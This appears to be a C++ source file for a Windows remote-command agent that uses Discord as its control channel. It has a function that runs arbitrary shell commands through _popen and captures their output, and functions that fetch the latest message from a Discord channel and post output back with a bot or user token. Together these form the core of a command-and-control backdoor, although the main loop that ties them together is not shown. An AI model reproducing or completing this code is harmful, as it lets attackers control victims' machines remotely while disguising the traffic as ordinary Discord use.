#include <iostream>
#include <cpr/cpr.h>
#include "connection.h"
#include <nlohmann/json.hpp>
using json = nlohmann::json;

std::string executeCommand(const std::string& command) {
    std::stringstream result;

   
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        std::cerr << "Failed to open pipe!" << std::endl;
        return "";  
    }

    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result << buffer; 
    }


    _pclose(pipe);


    return result.str();
}

std::string get_message(std::string channel_id,std::string token) {

	cpr::Response r = cpr::Get(cpr::Url{ "https://discord.com/api/v9/channels/" + channel_id + "/messages?limit=1" },
	cpr::Header{ {"authorization",token} });

    try
    {
        json Result = json::parse(r.text);

        return Result[0]["content"];
    }
    catch (const std::exception&)
    {
        return "";
    }
		

}

void send_message(std::string channel_id,std::string content,std::string token) {
	json payload = {{"content",content}} ;

	auto r = cpr::Post(cpr::Url{ "https://discord.com/api/v9/channels/"+channel_id+"/messages" },
		cpr::Header{ {"authorization",token}},
		cpr::Header{ {"Content-type","application/json"}},
		cpr::Body{payload.dump()});

}